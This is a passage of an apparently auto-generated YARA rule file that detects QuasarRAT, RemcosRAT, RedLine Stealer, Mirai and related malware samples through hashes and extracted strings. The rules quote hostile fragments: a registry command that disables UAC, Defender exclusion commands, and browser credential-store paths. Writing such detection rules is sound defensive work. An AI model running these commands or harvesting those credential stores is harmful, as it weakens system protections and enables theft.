      hash4 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
   strings:
      $x1 = "costura.system.collections.immutable.dll.compressed|7.0.0.0|System.Collections.Immutable, Version=7.0.0.0, Culture=neutral, Publ" ascii /* score: '44.00'*/
      $x2 = "costura.protobuf-net.core.dll.compressed|3.0.0.0|protobuf-net.Core, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2" ascii /* score: '39.00'*/
      $x3 = "costura.pulsar.common.dll.compressed|1.6.6.0|Pulsar.Common, Version=1.6.6.0, Culture=neutral, PublicKeyToken=null|Pulsar.Common." ascii /* score: '39.00'*/
      $x4 = "costura.protobuf-net.dll.compressed|3.0.0.0|protobuf-net, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67|prot" ascii /* score: '39.00'*/
      $x5 = "costura.protobuf-net.core.dll.compressed|3.0.0.0|protobuf-net.Core, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2" ascii /* score: '37.00'*/
      $x6 = "costura.protobuf-net.dll.compressed|3.0.0.0|protobuf-net, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67|prot" ascii /* score: '37.00'*/
      $x7 = "costura.system.collections.immutable.dll.compressed|7.0.0.0|System.Collections.Immutable, Version=7.0.0.0, Culture=neutral, Publ" ascii /* score: '33.00'*/
      $s8 = "icKeyToken=b03f5f7f11d50a3a|System.Collections.Immutable.dll|2F1EBB67E21B33C74C4C6CF217AC1F797959F18B|198784" fullword ascii /* score: '27.00'*/
      $s9 = "costura.protobuf-net.core.dll.compressed" fullword wide /* score: '22.00'*/
      $s10 = "costura.protobuf-net.dll.compressed" fullword wide /* score: '22.00'*/
      $s11 = "fodhelper.exe" fullword wide /* score: '22.00'*/
      $s12 = "Pulsar.Common.Messages.FunStuff.GDI" fullword ascii /* score: '17.00'*/
      $s13 = "obuf-net.dll|A6FF2228E8114A2B4040D0CA137C4B544FF034F4|277504" fullword ascii /* score: '14.00'*/
      $s14 = "e4d67|protobuf-net.Core.dll|D60DAF9ACAACBEB3DEF349C76F236DF1460A4797|289792" fullword ascii /* score: '14.00'*/
      $s15 = "float4 main(float4 position : SV_POSITION, float2 texCoord : TEXCOORD) : SV_Target" fullword wide /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__1895460fffad9475fda0c84755ecfee1_imphash__QuasarRAT_signature__1895460fffad9475fda0c84755ecfee1_imphas_14 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, QuasarRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_7b215872.exe, QuasarRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_d23c42d9.exe, RedLineStealer(signature).img, RedLineStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, RedLineStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_9f6b5b5b.exe, RedLineStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_a671c5c6.exe, RedLineStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_d5bc325e.exe, RedLineStealer(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_1c3f0685.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_3e5dc24c.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_65eb3667.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_817054de.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_8e77abb3.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b8d9098c.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_c1576456.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_d0b78168.exe, RemcosRAT(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_f8849b34.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d546ad096868b87ad9ae330ff7ae9ef8a6a031c62aa733139502d45a4ff97ef"
      hash2 = "7b215872f7a90c031aa6c7a9bd20d40b2327874cb41c46c0e80d33d4002cbaa9"
      hash3 = "d23c42d9523592ac276983f9fc4397d029084f8e9e67b46b98bea08d1853e3b2"
      hash4 = "5cef0fb48d09a432062780f6ae8c5313ce3c5427835ad3439cd4de830c26f3cc"
      hash5 = "567ef2de9b650b32612696d232585a0c436957db183e89bcaf5c66abe632cdcf"
      hash6 = "9f6b5b5bf70de1d92c1c84c7f9e65c57523b31817f50c2b06aaeb990be6c95be"
      hash7 = "a671c5c6e1139d0f39058afb351561e2016ae6e9155de8b9c95df9041b5887f4"
      hash8 = "d5bc325e667d561e33105971e625cc3d931ced9c2cd5cc28a879cd45fd8f7ce5"
      hash9 = "98add1fed5ddda047962ed272a20e27cca0ccdf0d81cf77df5bec022e50b5bf5"
      hash10 = "bf5289069b7b3f5c74a18fa352ee8770d00cdce6ed7cbfd4934d5480307806a1"
      hash11 = "1c3f06859b4cfc13ccb51f14d8551ee801167fc3abf29bbb1b872897f223585e"
      hash12 = "3e5dc24c78b7e9adf091d621235f04be8b83a31cdcbe635865c4f6453c4b59b9"
      hash13 = "65eb366739361b97fb68c0ac4b9fbaad2ac26e0c30a21ef0ad0a756177e22e94"
      hash14 = "817054de7a5f6ed946e3a184491ada8016399d36e01f1680e816389ef846a640"
      hash15 = "8e77abb3c916ddb2fa5b848a1ded6bba61f1ab25666065609f49c4144c6d95a6"
      hash16 = "b8d9098cd559f1cad2b5822c4f41a0e1d105878a95650967539014826a856220"
      hash17 = "c157645690ecde7d3fdd535ab1b3f4b419890cef5184ae94a2b02918f2cfabb0"
      hash18 = "d0b781684adc737fb5f167e009be024b3a0ecc63759df783e13bfd44b645aa74"
      hash19 = "f8849b34660e2f08205236ce99331ae9309ba088fc7b5125f443ee9e8f170145"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string*/ /* score: '22.50'*/
      $s6 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s10 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSLIST" fullword wide /* score: '17.50'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x0000 ) and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__1dac0fb7dad849409daf9e23353df461_imphash__RemcosRAT_signature__1dac0fb7dad849409daf9e23353df461_imphas_15 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_1dac0fb7dad849409daf9e23353df461(imphash).exe, RemcosRAT(signature)_1dac0fb7dad849409daf9e23353df461(imphash)_fd115b4c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c90455ab8904d561b6239a3e8b71677f107d1bb9c05a6b9a4d82d88b6dafe28"
      hash2 = "fd115b4c6b06b27f153fdea1e561c23b2b5a620a09555a6187351dcf4badb2c6"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide /* score: '26.00'*/
      $s5 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii /* score: '23.00'*/
      $s6 = "-Command \"Add-MpPreference -ExclusionPath '%s'\"" fullword wide /* score: '23.00'*/
      $s7 = "-Command \"Remove-MpPreference -ExclusionPath '%s'\"" fullword wide /* score: '23.00'*/
      $s8 = "rmclient.exe" fullword wide /* score: '22.00'*/
      $s9 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii /* score: '22.00'*/
      $s10 = "Keylogger initialization failure: error " fullword ascii /* score: '20.00'*/
      $s11 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" fullword ascii /* score: '19.00'*/
      $s12 = "Online Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s13 = "Offline Keylogger Started" fullword ascii /* score: '17.00'*/
      $s14 = "Online Keylogger Started" fullword ascii /* score: '17.00'*/
      $s15 = "Offline Keylogger Stopped" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "1dac0fb7dad849409daf9e23353df461" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__ec70ee15_Mirai_signature__f7a08a55_16 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_ec70ee15.elf, Mirai(signature)_f7a08a55.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec70ee1555dbbe958830e43f16758bd5ecc6fa11c8703e151a3431ab33ce1722"
      hash2 = "f7a08a5591cb5e836c27ebb85a88cd4e6f69f31d4aef1d07d830396b3b4f8cc8"
   strings:
      $s1 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii /* score: '24.00'*/
      $s2 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s3 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s4 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s5 = "Unexpected error %d on netlink descriptor %d (address family %d)." fullword ascii /* score: '19.00'*/
      $s6 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s7 = "%s: line %d: bad command `%s'" fullword ascii /* score: '17.50'*/
      $s8 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s9 = "Unexpected error %d on netlink descriptor %d." fullword ascii /* score: '16.00'*/
      $s10 = "Unexpected netlink response of size %zd on descriptor %d (address family %d)" fullword ascii /* score: '16.00'*/
      $s11 = "mutex->__data.__owner == 0" fullword ascii /* score: '15.00'*/
      $s12 = "dig_no > int_no && exponent <= 0 && exponent >= MIN_10_EXP - (DIG + 2)" fullword ascii /* score: '15.00'*/
      $s13 = "*** %s ***: terminated" fullword ascii /* score: '15.00'*/
      $s14 = "(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned l" ascii /* score: '15.00'*/
      $s15 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e2f43548_RedLineStealer_signature__f34d5f2d4577ed6d9cee_18 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e2f43548.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fcdc9e82.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2f435485baa82011fb87477cf73d40c87b87a3579b11ea8d3cb22883ad33682"
      hash2 = "fcdc9e821a1bd97c87b1c9b9fed76a070f3ff81a0ee0838f49a915336851a029"
   strings:
      $s1 = "System.Windows.Forms.HorizontalAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" ascii /* score: '27.00'*/
      $s2 = "System.Windows.Forms.LeftRightAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" ascii /* score: '27.00'*/
      $s3 = "Vip.CustomForm.Images.SystemButtons.bmp" fullword wide /* score: '17.00'*/
      $s4 = "m_systemCommands" fullword ascii /* score: '15.00'*/
      $s5 = "GetButtonCommand" fullword ascii /* score: '12.00'*/
      $s6 = "OnWmSysCommand" fullword ascii /* score: '12.00'*/
      $s7 = "get_FrameLayout" fullword ascii /* score: '12.00'*/
      $s8 = "-Gets or Set Value to Drop Shadow to the form." fullword ascii /* score: '11.00'*/
      $s9 = "get_MdiMinimizeBox" fullword ascii /* score: '9.00'*/
      $s10 = "get_IconAlign" fullword ascii /* score: '9.00'*/
      $s11 = "get_EnableTouchMode" fullword ascii /* score: '9.00'*/
      $s12 = "get_MetroColor" fullword ascii /* score: '9.00'*/
      $s13 = "get_IsWindows7" fullword ascii /* score: '9.00'*/
      $s14 = "get_PressedButton" fullword ascii /* score: '9.00'*/
      $s15 = "get_MinimizeButton" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_19 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash3 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash4 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash5 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash6 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash7 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash8 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash9 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $x1 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '31.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<Quasar.Common.Models.FileChunk>.get_Current" fullword ascii /* score: '22.00'*/
      $s3 = "Oprotobuf-net, Version=2.4.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67" fullword ascii /* score: '21.00'*/
      $s4 = "BQuasar.Client.Extensions.RegistryKeyExtensions+<GetKeyValues>d__15" fullword ascii /* score: '20.00'*/
      $s5 = "Quasar.Common.Messages.ReverseProxy" fullword ascii /* score: '17.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Quasar.Common.Models.FileChunk>.Current" fullword ascii /* score: '17.00'*/
      $s7 = ".Quasar.Common.IO.FileSplit+<GetEnumerator>d__9" fullword ascii /* score: '16.00'*/
      $s8 = "Quasar.Common.Messages" fullword ascii /* score: '14.00'*/
      $s9 = "Quasar.Common.Enums" fullword ascii /* score: '14.00'*/
      $s10 = "WriteGetKeyImpl" fullword ascii /* score: '12.00'*/
      $s11 = ".NETFramework,Version=v4.5.2" fullword ascii /* score: '10.00'*/
      $s12 = "CurrentUserRunOnce" fullword ascii /* score: '10.00'*/
      $s13 = ".NET Framework 4.5.2" fullword ascii /* score: '10.00'*/
      $s14 = "CurrentUserRun" fullword ascii /* score: '10.00'*/
      $s15 = "get_Accessibility" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2f3c0ed2_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_20 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash2 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<xClient.Core.MouseKeyHook.KeyPressEventArgsExt>.get_Current" fullword ascii /* score: '18.00'*/
      $s2 = "http://ip-api.com/json/" fullword wide /* score: '17.00'*/
      $s3 = "System.Collections.Generic.IEnumerator<xClient.Core.MouseKeyHook.KeyPressEventArgsExt>.Current" fullword ascii /* score: '13.00'*/
      $s4 = "Crossbar configuration is not supported by currently running video source." fullword wide /* score: '13.00'*/
      $s5 = "get_FramesReceived" fullword ascii /* score: '12.00'*/
      $s6 = "<GetGenReader>b__4_0" fullword ascii /* score: '12.00'*/
      $s7 = "GetMaxAvailableFrameRate" fullword ascii /* score: '12.00'*/
      $s8 = "get_RemoteAdresses" fullword ascii /* score: '12.00'*/
      $s9 = "GetCurrentActualFrameRate" fullword ascii /* score: '12.00'*/
      $s10 = "get_DesiredFrameSize" fullword ascii /* score: '12.00'*/
      $s11 = "<GetFormattedKeyValues>d__15" fullword ascii /* score: '12.00'*/
      $s12 = "GetFrameRateList" fullword ascii /* score: '12.00'*/
      $s13 = "rmdir /q /s \"" fullword wide /* score: '12.00'*/
      $s14 = "remoteadresses" fullword ascii /* score: '11.00'*/
      $s15 = "remoteports" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__26160f48_RedLineStealer_signature__f34d5f2d4577ed6d9cee_21 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_26160f48.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5bbcc015.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26160f483487ec164d3b40e9ca5d1f6e5fef76d02d5530c22cd34374f8fd684f"
      hash2 = "5bbcc015fb254fe8bbe92dad15a7cf8bfad2aa1715487d535107fd91c4beb3c0"
   strings:
      $s1 = "GetPlainTextContent" fullword ascii /* score: '14.00'*/
      $s2 = "get_PlainTextContent" fullword ascii /* score: '14.00'*/
      $s3 = "get_YouTube_Logo" fullword ascii /* score: '14.00'*/
      $s4 = "SmartNote - Intelligent Note Manager" fullword wide /* score: '12.00'*/
      $s5 = "Text files (*.txt)|*.txt|HTML files (*.html)|*.html" fullword wide /* score: '11.00'*/
      $s6 = "Error exporting notes: " fullword wide /* score: '10.00'*/
      $s7 = "get_TotalWords" fullword ascii /* score: '9.00'*/
      $s8 = "get_DeletedNotes" fullword ascii /* score: '9.00'*/
      $s9 = "get_AutoSaveEnabled" fullword ascii /* score: '9.00'*/
      $s10 = "GetTimeSinceModified" fullword ascii /* score: '9.00'*/
      $s11 = "get_SpellCheckEnabled" fullword ascii /* score: '9.00'*/
      $s12 = "get_BackupEnabled" fullword ascii /* score: '9.00'*/
      $s13 = "<GetDeletedNotes>b__11_1" fullword ascii /* score: '9.00'*/
      $s14 = "<GetTagsArray>b__54_1" fullword ascii /* score: '9.00'*/
      $s15 = "<GetDeletedNotes>b__11_0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__646167cce332c1c252cdcb1839e0cf48_imphash__Nitol_signature__646167cce332c1c252cdcb1839e0cf48_imphash__Pu_22 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, Nitol(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, PureLogsStealer(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, PureLogsStealer(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_bbca8248.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a26b584f55654d8a4a47744fdcdc01d19f86bfabf4bcb0f2305700d1600758ab"
      hash2 = "a4fe410865c4277efe42382e954fe2f33fd74854662fc575f2e29cd361931f50"
      hash3 = "1c363b6e4b6d06a33c148a038885e08178950af9fbbc7485ea0d571b2e45ca81"
      hash4 = "bbca824815eb8e8976899c439fe5479f3f6705b01b530fbb49a337d54168aaa7"
   strings:
      $s1 = " Shell32.DLL " fullword wide /* score: '24.00'*/
      $s2 = " OpenProcessToken.3" fullword wide /* score: '18.00'*/
      $s3 = " advpack.dll.H" fullword wide /* score: '16.00'*/
      $s4 = " Command /?." fullword wide /* score: '14.00'*/
      $s5 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s6 = "     processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s7 = "          processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s8 = "DSystem\\CurrentControlSet\\Control\\Session Manager" fullword ascii /* score: '10.00'*/
      $s9 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s10 = " Windows NT." fullword wide /* score: '9.00'*/
      $s11 = "/Q -- " fullword wide /* score: '9.00'*/
      $s12 = "/C -- " fullword wide /* score: '9.00'*/
      $s13 = "  <assemblyIdentity version=\"5.1.0.0\"" fullword ascii /* score: '8.00'*/
      $s14 = " GetProcAddress() " fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and pe.imphash() == "646167cce332c1c252cdcb1839e0cf48" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__RemcosRAT_signature__2d833381_23 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature).7z, RemcosRAT(signature)_2d833381.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32b48f0695fb53b1583326fab89246b2568e045016539dad2b15ccb5d515afcd"
      hash2 = "2d8333812a01bcf27895c943e9dea10bb0007a775941ed45855a3f741b36bb36"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s13 = "' Assign Base64 Encoded Payload" fullword ascii /* score: '25.00'*/
      $s14 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s15 = "AAAAAEAAAA" ascii /* base64 encoded string */ /* score: '16.50'*/
   condition:
      ( ( uint16(0) == 0x6152 or uint16(0) == 0x704f ) and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6930fae0_RedLineStealer_signature__f34d5f2d4577ed6d9cee_24 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6930fae0.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_734bb8b0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6930fae092d170045ef16fe16ff486e4232e95ce5092a10c8d42f07bffa0f3e4"
      hash2 = "734bb8b05e5a6728e15a199bd216842ad5650e4401166d4debcde4819ec3d044"
   strings:
      $s1 = "statistics.dat" fullword wide /* score: '14.00'*/
      $s2 = "highscores.dat" fullword wide /* score: '14.00'*/
      $s3 = "get_GamesCompleted" fullword ascii /* score: '12.00'*/
